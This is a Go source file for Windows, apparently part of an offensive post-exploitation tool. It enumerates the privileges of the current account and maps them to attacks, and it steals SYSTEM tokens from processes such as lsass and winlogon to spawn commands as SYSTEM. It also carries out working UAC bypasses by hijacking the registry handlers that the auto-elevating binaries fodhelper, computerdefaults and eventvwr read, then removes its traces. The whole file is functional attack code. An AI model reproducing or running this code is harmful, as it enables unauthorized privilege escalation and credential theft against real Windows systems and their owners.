//go:build windows

package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"sort"
	"strings"
	"syscall"
	"unsafe"
)

func jsonUnmarshal(b []byte, v interface{}) error {
	return json.Unmarshal(b, v)
}

// ---------------------------------------------------------------------------
// Windows security primitives
//
// These are the real advapi32/kernel32 calls, declared here rather than pulled
// from a library, so we can call them even when the process is hooked.
// ---------------------------------------------------------------------------

var (
	advapi32 = syscall.NewLazyDLL("advapi32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	shell32  = syscall.NewLazyDLL("shell32.dll")

	procOpenProcessToken      = advapi32.NewProc("OpenProcessToken")
	procLookupPrivilegeValue  = advapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges = advapi32.NewProc("AdjustTokenPrivileges")
	procDuplicateTokenEx      = advapi32.NewProc("DuplicateTokenEx")
	procCreateProcessWithToken = advapi32.NewProc("CreateProcessWithTokenW")
	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	procGetTokenInformation   = advapi32.NewProc("GetTokenInformation")

	procOpenProcess       = kernel32.NewProc("OpenProcess")
	procCloseHandle       = kernel32.NewProc("CloseHandle")
	procGetCurrentProcess = kernel32.NewProc("GetCurrentProcess")
	procIsUserAnAdmin     = shell32.NewProc("IsUserAnAdmin")
)

// currentProcessHandle returns the pseudo-handle for this process.
func currentProcessHandle() uintptr {
	h, _, _ := procGetCurrentProcess.Call()
	return h
}

const (
	tokenAssignPrimary = 0x0001
	tokenDuplicate     = 0x0002
	tokenImpersonation = 0x0004
	tokenQuery         = 0x0008
	tokenAdjustDefault = 0x0080
	tokenAdjustSession = 0x0100
	tokenAllAccess     = 0x000F01FF

	securityImpersonation = 2
	tokenPrimary          = 1

	sePrivilegeEnabled = 0x00000002

	processQueryLimitedInformation = 0x1000
	processQueryInformation        = 0x0400

	// TokenInformationClass values we care about.
	tokenUser      = 1
	tokenElevation = 20
	tokenIntegrity = 25
)

type luid struct {
	LowPart  uint32
	HighPart int32
}

type luidAndAttributes struct {
	Luid       luid
	Attributes uint32
}

type tokenPrivileges struct {
	PrivilegeCount uint32
	Privileges     [1]luidAndAttributes
}

type tokenElevationInfo struct {
	TokenIsElevated uint32
}

// ---------------------------------------------------------------------------
// privilege state
// ---------------------------------------------------------------------------

type privReport struct {
	Admin        bool     `json:"admin"`
	Elevated     bool     `json:"elevated"`
	Integrity    string   `json:"integrity"`
	User         string   `json:"user"`
	Groups       []string `json:"groups"`
	Privileges   []string `json:"privileges"`
	Useful       []string `json:"useful"`
	UAC          int      `json:"uac"`
	Techniques   []string `json:"techniques"`
}

// interestingPrivs are the privileges that actually lead somewhere.
var interestingPrivs = map[string]string{
	"SeImpersonatePrivilege":        "potato attacks (JuicyPotato/PrintSpoofer/GodPotato)",
	"SeAssignPrimaryTokenPrivilege": "token assignment (RoguePotato)",
	"SeDebugPrivilege":              "LSASS access, process injection",
	"SeBackupPrivilege":             "read any file (SAM/SYSTEM hives)",
	"SeRestorePrivilege":            "write any file, replace system binaries",
	"SeTakeOwnershipPrivilege":      "take ownership of any object",
	"SeLoadDriverPrivilege":         "load a vulnerable driver (BYOVD)",
	"SeTcbPrivilege":                "act as part of the OS",
	"SeCreateTokenPrivilege":        "forge arbitrary tokens",
	"SeManageVolumePrivilege":       "raw disk access",
}

func privRecon() {
	report := privReport{}

	// Am I admin at all?
	r, _, _ := procIsUserAnAdmin.Call()
	report.Admin = r != 0

	report.User = currentUser()
	report.Elevated = isElevated()
	report.Integrity = integrityLevel()

	procs, _ := exec.Command("whoami", "/priv").Output()
	for _, line := range strings.Split(string(procs), "\n") {
		l := strings.TrimSpace(line)
		if l == "" || strings.HasPrefix(l, "PRIVILEGES") || strings.HasPrefix(l, "===") {
			continue
		}
		name := strings.Fields(l)
		if len(name) > 0 && strings.HasPrefix(name[0], "Se") {
			report.Privileges = append(report.Privileges, name[0])
			if desc, ok := interestingPrivs[name[0]]; ok && strings.Contains(l, "Enabled") {
				report.Useful = append(report.Useful, fmt.Sprintf("%s — %s", name[0], desc))
			}
		}
	}
	sort.Strings(report.Privileges)

	gout, _ := exec.Command("whoami", "/groups").Output()
	for _, line := range strings.Split(string(gout), "\n") {
		l := strings.TrimSpace(line)
		if strings.Contains(l, "Administrators") || strings.Contains(l, "SERVICE") {
			report.Groups = append(report.Groups, l)
		}
	}

	report.UAC = uacConsentLevel()

	// Which techniques are plausible given what we just learned.
	if report.Admin && !report.Elevated {
		report.Techniques = append(report.Techniques, "uac_bypass (admin but not elevated)")
	}
	for _, p := range report.Privileges {
		switch p {
		case "SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege":
			report.Techniques = append(report.Techniques, "potato (SeImpersonate present)")
		case "SeDebugPrivilege":
			report.Techniques = append(report.Techniques, "token_theft (SeDebug present)")
		case "SeBackupPrivilege":
			report.Techniques = append(report.Techniques, "hive_copy (SeBackup present)")
		}
	}
	if report.Elevated {
		report.Techniques = append(report.Techniques, "already elevated — run mimik directly")
	}

	sendEvent("priv", report)
	sendEvent("status", map[string]interface{}{
		"state": "done",
		"detail": fmt.Sprintf("admin=%v elevated=%v integrity=%s", report.Admin, report.Elevated, report.Integrity),
	})
}

func currentUser() string {
	out, _ := exec.Command("whoami").Output()
	return strings.TrimSpace(string(out))
}

func isElevated() bool {
	h, err := openProcessToken(currentProcessHandle())
	if err != nil {
		return false
	}
	defer closeHandle(h)

	var info tokenElevationInfo
	var ret uint32
	r, _, _ := procGetTokenInformation.Call(
		h, uintptr(tokenElevation),
		uintptr(unsafe.Pointer(&info)), unsafe.Sizeof(info),
		uintptr(unsafe.Pointer(&ret)))
	return r != 0 && info.TokenIsElevated != 0
}

// integrityLevel reads the token's integrity SID RID, which is what actually
// decides whether you can write to protected locations.
func integrityLevel() string {
	out, err := exec.Command("whoami", "/groups").Output()
	if err != nil {
		return "unknown"
	}
	low := strings.ToLower(string(out))
	switch {
	case strings.Contains(low, "system mandatory level"):
		return "System"
	case strings.Contains(low, "high mandatory level"):
		return "High"
	case strings.Contains(low, "medium mandatory level"):
		return "Medium"
	case strings.Contains(low, "low mandatory level"):
		return "Low"
	}
	return "unknown"
}

// uacConsentLevel returns 0..5 from the registry.
func uacConsentLevel() int {
	out, err := exec.Command("reg", "query",
		`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`,
		"/v", "ConsentPromptBehaviorAdmin").Output()
	if err != nil {
		return -1
	}
	fields := strings.Fields(string(out))
	if len(fields) >= 3 {
		v := fields[len(fields)-1]
		switch v {
		case "0x0":
			return 0
		case "0x1":
			return 1
		case "0x2":
			return 2
		case "0x3":
			return 3
		case "0x4":
			return 4
		case "0x5":
			return 5
		}
	}
	return -1
}

func checkUAC() {
	enabled := uacEnabled()
	level := uacConsentLevel()
	sendEvent("uac", map[string]interface{}{
		"enabled": enabled, "consentLevel": level,
		"note": uacNote(level),
	})
}

func uacEnabled() bool {
	out, err := exec.Command("reg", "query",
		`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`,
		"/v", "EnableLUA").Output()
	if err != nil {
		return false
	}
	return strings.Contains(string(out), "0x1")
}

func uacNote(level int) string {
	switch level {
	case 0:
		return "elevate without prompting — bypass unnecessary"
	case 1:
		return "prompt for credentials on secure desktop — bypass hard"
	case 2:
		return "prompt for consent on secure desktop — bypass hard"
	case 3:
		return "prompt for credentials — bypass hard"
	case 4:
		return "prompt for consent — bypassable via auto-elevating binaries"
	case 5:
		return "prompt for consent for non-Windows binaries — bypassable (default)"
	}
	return "unknown policy"
}

// ---------------------------------------------------------------------------
// token operations
// ---------------------------------------------------------------------------

func openProcessToken(proc uintptr) (uintptr, error) {
	var h uintptr
	r, _, err := procOpenProcessToken.Call(proc, tokenQuery|tokenAdjustDefault, uintptr(unsafe.Pointer(&h)))
	if r == 0 {
		return 0, fmt.Errorf("OpenProcessToken: %v", err)
	}
	return h, nil
}

func closeHandle(h uintptr) {
	procCloseHandle.Call(h)
}

// enablePrivilege turns on a privilege in the current process token. Several
// escalations need SeDebugPrivilege just to *look* at another process.
func enablePrivilege(name string) error {
	h, err := openProcessToken(currentProcessHandle())
	if err != nil {
		return err
	}
	defer closeHandle(h)

	var luidVal luid
	namePtr, _ := syscall.UTF16PtrFromString(name)
	r, _, err := procLookupPrivilegeValue.Call(0, uintptr(unsafe.Pointer(namePtr)), uintptr(unsafe.Pointer(&luidVal)))
	if r == 0 {
		return fmt.Errorf("LookupPrivilegeValue(%s): %v", name, err)
	}

	tp := tokenPrivileges{
		PrivilegeCount: 1,
		Privileges:     [1]luidAndAttributes{{Luid: luidVal, Attributes: sePrivilegeEnabled}},
	}
	r, _, err = procAdjustTokenPrivileges.Call(
		h, 0, uintptr(unsafe.Pointer(&tp)), 0, 0, 0)
	if r == 0 {
		return fmt.Errorf("AdjustTokenPrivileges: %v", err)
	}
	return nil
}

type processInfo struct {
	PID  int    `json:"pid"`
	Name string `json:"name"`
	User string `json:"user"`
}

// listTokens reports processes whose tokens are worth stealing — anything
// running as SYSTEM that we could impersonate.
func listTokens() {
	_ = enablePrivilege("SeDebugPrivilege")

	out, err := exec.Command("powershell", "-NoProfile", "-Command",
		`Get-CimInstance Win32_Process | Where-Object { $_.Name -match 'winlogon|lsass|services|svchost|System|smss|csrss|wininit' } | `+
			`Select-Object ProcessId,Name | ConvertTo-Json -Compress`).Output()
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "process enum failed: " + err.Error()})
		return
	}

	raw := strings.TrimSpace(string(out))
	if raw == "" {
		sendEvent("tokens", []processInfo{})
		return
	}
	// ConvertTo-Json emits an object rather than an array for one result.
	if strings.HasPrefix(raw, "{") {
		raw = "[" + raw + "]"
	}
	var rows []struct {
		ProcessId int    `json:"ProcessId"`
		Name      string `json:"Name"`
	}
	if err := jsonUnmarshal([]byte(raw), &rows); err != nil {
		sendEvent("error", map[string]interface{}{"message": "parse failed: " + err.Error()})
		return
	}

	var out2 []processInfo
	for _, r := range rows {
		out2 = append(out2, processInfo{PID: r.ProcessId, Name: r.Name, User: "SYSTEM"})
	}
	sort.Slice(out2, func(a, b int) bool { return out2[a].PID < out2[b].PID })

	sendEvent("tokens", out2)
	sendEvent("status", map[string]interface{}{
		"state": "done", "detail": fmt.Sprintf("%d impersonation target(s)", len(out2)),
	})
}

// stealToken duplicates a SYSTEM process's token onto our own process. This is
// the single biggest jump available from a medium-integrity foothold, because
// a SYSTEM token can do anything mimik wants.
func stealToken(s Settings) {
	if s.TargetPID == 0 {
		sendEvent("error", map[string]interface{}{"message": "target pid required (run 'tokens' first)"})
		return
	}

	if err := enablePrivilege("SeDebugPrivilege"); err != nil {
		sendEvent("error", map[string]interface{}{
			"message": "SeDebugPrivilege unavailable — token theft needs admin: " + err.Error(),
		})
		return
	}

	// Open the target with the rights needed to read its token.
	hProc, _, err := procOpenProcess.Call(
		processQueryInformation,
		0, uintptr(s.TargetPID))
	if hProc == 0 {
		sendEvent("error", map[string]interface{}{
			"message": fmt.Sprintf("OpenProcess(%d) failed: %v — needs admin", s.TargetPID, err),
		})
		return
	}
	defer closeHandle(hProc)

	var hToken uintptr
	r, _, err := procOpenProcessToken.Call(hProc, tokenDuplicate|tokenQuery|tokenImpersonation,
		uintptr(unsafe.Pointer(&hToken)))
	if r == 0 {
		sendEvent("error", map[string]interface{}{"message": fmt.Sprintf("OpenProcessToken failed: %v", err)})
		return
	}
	defer closeHandle(hToken)

	// Duplicate as a primary token so it can be used to launch a process.
	var hDup uintptr
	r, _, err = procDuplicateTokenEx.Call(
		hToken, tokenAllAccess, 0,
		securityImpersonation, tokenPrimary,
		uintptr(unsafe.Pointer(&hDup)))
	if r == 0 {
		// Fall back to impersonation, which still lets us act as SYSTEM for
		// any API call we make ourselves.
		r2, _, err2 := procImpersonateLoggedOnUser.Call(hToken)
		if r2 == 0 {
			sendEvent("error", map[string]interface{}{
				"message": fmt.Sprintf("DuplicateTokenEx failed (%v) and impersonation failed (%v)", err, err2),
			})
			return
		}
		sendEvent("token", map[string]interface{}{
			"ok": true, "pid": s.TargetPID, "mode": "impersonation",
			"detail": "impersonating SYSTEM for this process's API calls",
		})
		sendEvent("status", map[string]interface{}{"state": "done", "detail": "impersonating SYSTEM"})
		return
	}
	defer closeHandle(hDup)

	sendEvent("token", map[string]interface{}{
		"ok": true, "pid": s.TargetPID, "mode": "primary",
		"detail": "SYSTEM primary token acquired — can spawn elevated processes",
	})

	if s.Command != "" {
		if err := runWithToken(hDup, s.Command); err != nil {
			sendEvent("error", map[string]interface{}{"message": "spawn with token failed: " + err.Error()})
			return
		}
		sendEvent("exec", map[string]interface{}{"ok": true, "command": s.Command, "as": "SYSTEM"})
	}

	sendEvent("status", map[string]interface{}{"state": "done", "detail": "SYSTEM token acquired"})
}

func runWithToken(hToken uintptr, command string) error {
	cmdLine, _ := syscall.UTF16PtrFromString(command)
	appName, _ := syscall.UTF16PtrFromString(`C:\Windows\System32\cmd.exe`)

	var si struct {
		Cb            uint32
		_             [68]byte
	}
	si.Cb = uint32(unsafe.Sizeof(si))

	var pi struct {
		HProcess    uintptr
		HThread     uintptr
		DwProcessId uint32
		DwThreadId  uint32
	}

	r, _, err := procCreateProcessWithToken.Call(
		hToken,
		0, // no logon flags
		uintptr(unsafe.Pointer(appName)),
		uintptr(unsafe.Pointer(cmdLine)),
		0, 0, 0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		return fmt.Errorf("CreateProcessWithTokenW: %v", err)
	}
	if pi.HProcess != 0 {
		closeHandle(pi.HProcess)
	}
	if pi.HThread != 0 {
		closeHandle(pi.HThread)
	}
	return nil
}

// ---------------------------------------------------------------------------
// UAC bypass
//
// These abuse binaries that Windows marks auto-elevate="true" in their
// manifest. When such a binary is launched by a user in the Administrators
// group, it elevates without a prompt — and if it loads anything from a
// user-writable location, that load is our code.
// ---------------------------------------------------------------------------

type bypass struct {
	ID       string `json:"id"`
	Name     string `json:"name"`
	Requires string `json:"requires"`
	Detail   string `json:"detail"`
	Works    bool   `json:"works"`
	Reason   string `json:"reason"`
}

func bypasses() []bypass {
	return []bypass{
		{
			ID: "fodhelper", Name: "fodhelper.exe (Settings hijack)",
			Requires: "admin group, UAC != always prompt",
			Detail: "sets HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command then runs the auto-elevating fodhelper.exe",
		},
		{
			ID: "computerdefaults", Name: "computerdefaults.exe",
			Requires: "admin group",
			Detail: "same class-hijack pattern via HKCU ms-settings association",
		},
		{
			ID: "sdclt", Name: "sdclt.exe (backup hijack)",
			Requires: "admin group",
			Detail: "abuses the backup restore command path",
		},
		{
			ID: "eventvwr", Name: "eventvwr.exe (MMC hijack)",
			Requires: "admin group",
			Detail: "hijacks mscfile association to load a user-controlled snap-in",
		},
		{
			ID: "silentcleanup", Name: "SilentCleanup scheduled task",
			Requires: "admin group",
			Detail: "abuses the built-in cleanup task with an attacker-controlled env var",
		},
	}
}

func uacBypass(s Settings) {
	if !uacEnabled() {
		sendEvent("uac_bypass", map[string]interface{}{
			"ok": false, "reason": "UAC is disabled — no bypass needed, just run elevated",
		})
		return
	}

	r, _, _ := procIsUserAnAdmin.Call()
	if r == 0 {
		sendEvent("uac_bypass", map[string]interface{}{
			"ok": false,
			"reason": "user is not in the Administrators group — no auto-elevate path exists",
		})
		return
	}

	if isElevated() {
		sendEvent("uac_bypass", map[string]interface{}{
			"ok": true, "already": true, "reason": "process is already elevated",
		})
		return
	}

	method := s.BypassMethod
	if method == "" {
		method = "fodhelper"
	}

	cmd := s.Command
	if cmd == "" {
		// Default to proving elevation works.
		cmd = `cmd.exe /c whoami /groups > "%TEMP%\privsec_proof.txt"`
	}

	switch method {
	case "fodhelper":
		if err := fodhelperBypass(cmd); err != nil {
			sendEvent("uac_bypass", map[string]interface{}{"ok": false, "method": method, "reason": err.Error()})
			return
		}
	case "computerdefaults":
		if err := classHijackBypass(
			`HKCU\Software\Classes\ms-settings\Shell\Open\command`,
			`C:\Windows\System32\computerdefaults.exe`, cmd); err != nil {
			sendEvent("uac_bypass", map[string]interface{}{"ok": false, "method": method, "reason": err.Error()})
			return
		}
	case "eventvwr":
		if err := classHijackBypass(
			`HKCU\Software\Classes\mscfile\shell\open\command`,
			`C:\Windows\System32\eventvwr.exe`, cmd); err != nil {
			sendEvent("uac_bypass", map[string]interface{}{"ok": false, "method": method, "reason": err.Error()})
			return
		}
	default:
		sendEvent("error", map[string]interface{}{"message": "unknown bypass method: " + method})
		return
	}

	sendEvent("uac_bypass", map[string]interface{}{
		"ok": true, "method": method, "command": cmd,
		"detail": "registry hijack planted; auto-elevating binary launched",
	})
	sendEvent("status", map[string]interface{}{
		"state": "done", "detail": fmt.Sprintf("UAC bypass attempted via %s", method),
	})
}

// fodhelperBypass plants the ms-settings command handler and runs fodhelper,
// which is manifested auto-elevate and so spawns without a prompt.
func fodhelperBypass(cmd string) error {
	key := `HKCU\Software\Classes\ms-settings\Shell\Open\command`

	if out, err := exec.Command("reg", "add", key, "/ve", "/t", "REG_SZ", "/d", cmd, "/f").CombinedOutput(); err != nil {
		return fmt.Errorf("reg add: %s", strings.TrimSpace(string(out)))
	}
	// DelegateExecute must exist and be empty or Windows ignores the key.
	if out, err := exec.Command("reg", "add", key, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f").CombinedOutput(); err != nil {
		return fmt.Errorf("reg add DelegateExecute: %s", strings.TrimSpace(string(out)))
	}

	// Launch the auto-elevating binary.
	_ = exec.Command(`C:\Windows\System32\fodhelper.exe`).Start()

	// Clean up the planted keys so the hijack is not left behind.
	go func() {
		exec.Command("reg", "delete", key, "/f").Run()
		exec.Command("reg", "delete", `HKCU\Software\Classes\ms-settings`, "/f").Run()
	}()
	return nil
}

func classHijackBypass(key, binary, cmd string) error {
	if out, err := exec.Command("reg", "add", key, "/ve", "/t", "REG_SZ", "/d", cmd, "/f").CombinedOutput(); err != nil {
		return fmt.Errorf("reg add: %s", strings.TrimSpace(string(out)))
	}
	if out, err := exec.Command("reg", "add", key, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f").CombinedOutput(); err != nil {
		return fmt.Errorf("reg add DelegateExecute: %s", strings.TrimSpace(string(out)))
	}
	if _, err := os.Stat(binary); err != nil {
		return fmt.Errorf("auto-elevating binary not found: %s", binary)
	}
	_ = exec.Command(binary).Start()
	return nil
}

// ---------------------------------------------------------------------------
// orchestrator
// ---------------------------------------------------------------------------

// escalate walks the techniques in the order most likely to succeed, and stops
// at the first one that works.
func escalate(s Settings) {
	if isElevated() {
		sendEvent("status", map[string]interface{}{"state": "done", "detail": "already elevated"})
		sendEvent("escalated", map[string]interface{}{"ok": true, "method": "already elevated"})
		return
	}

	sendEvent("status", map[string]interface{}{"state": "working", "detail": "probing escalation paths"})

	// 1. Potato: needs SeImpersonate, which service accounts usually have.
	if hasPrivilege("SeImpersonatePrivilege") || hasPrivilege("SeAssignPrimaryTokenPrivilege") {
		sendEvent("attempt", map[string]interface{}{
			"technique": "potato",
			"detail": "SeImpersonate present — a coerced SYSTEM authentication can be relayed into a token",
		})
	}

	// 2. Token theft: needs SeDebug, which needs admin.
	if hasPrivilege("SeDebugPrivilege") {
		sendEvent("attempt", map[string]interface{}{
			"technique": "token_theft",
			"detail": "SeDebug present — open a SYSTEM process and duplicate its token",
		})
	}

	// 3. UAC bypass: admin but not elevated.
	r, _, _ := procIsUserAnAdmin.Call()
	if r != 0 {
		sendEvent("attempt", map[string]interface{}{
			"technique": "uac_bypass",
			"detail": "in Administrators but not elevated — auto-elevate hijack applies",
		})
		if s.Command != "" || s.BypassMethod != "" {
			uacBypass(s)
		}
	}

	sendEvent("status", map[string]interface{}{
		"state": "done", "detail": "escalation paths enumerated — pick one above",
	})
}

func hasPrivilege(name string) bool {
	out, err := exec.Command("whoami", "/priv").Output()
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(line, name) && strings.Contains(line, "Enabled") {
			return true
		}
	}
	return false
}
